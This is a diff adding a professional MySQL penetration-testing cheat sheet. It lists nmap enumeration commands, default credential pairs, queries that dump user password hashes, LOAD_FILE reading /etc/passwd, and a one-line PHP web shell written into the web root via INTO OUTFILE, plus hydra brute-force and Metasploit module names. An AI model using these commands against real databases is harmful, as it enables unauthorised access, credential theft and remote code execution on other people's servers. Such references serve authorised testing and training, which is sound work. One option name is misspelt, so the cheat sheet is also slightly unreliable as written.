@@ -1,0 +1,85 @@
+==============================
+MySQL (Relational Database)
+Cheat Sheet – Professional
+==============================
+
+PORT:
+3306/TCP – MySQL default
+
+Transport:
+TCP
+
+Authentication:
+Username / Password
+(MySQL native, caching_sha2_password)
+
+Purpose:
+Relational database service
+(Web apps, CMS, internal systems)
+
+--------------------------------
+1. BASIC ENUMERATION
+--------------------------------
+
+nmap -p3306 -sV <IP>
+nmap -p3306 --script mysql-* <IP>
+
+mysql -h <IP> -u root
+nmap -p3306 --script mysql-info <IP>
+
+Common credentials:
+root : root
+root : password
+root : (empty)
+admin : admin
+mysql : mysql
+
+# Local
+mysql -u root -p --ssl-moode=DISABLED
+
+# Remote
+mysql -h <IP> -u user -p
+
+# Specify database
+mysql -h <IP> -u user -p dbname
+
+SHOW DATABASES;
+USE dbname;
+SHOW TABLES;
+DESCRIBE table;
+SELECT * FROM table;
+
+SELECT user, host FROM mysql.user;
+SELECT user, authentication_string FROM mysql.user;
+
+SHOW VARIABLES LIKE 'secure_file_priv';
+SELECT LOAD_FILE('/etc/passwd');
+
+SELECT "<?php system($_GET['cmd']); ?>" 
+INTO OUTFILE '/var/www/html/shell.php';
+SHOW GRANTS FOR CURRENT_USER;
+SHOW GRANTS FOR 'user'@'host';
+
+hydra -L users.txt -P passwords.txt mysql://<IP>
+
+use auxiliary/scanner/mysql/mysql_login
+use auxiliary/admin/mysql/mysql_enum
+use auxiliary/admin/mysql/mysql_sql
+
+/etc/mysql/my.cnf
+/etc/my.cnf
+~/.my.cnf
+
+/var/log/mysql/error.log
+/var/log/mysql/mysql.log
+
+MySQL
+MariaDB
+Percona Server
+
+mysql-client
+nmap
+hydra
+metasploit
+sqlmap
+
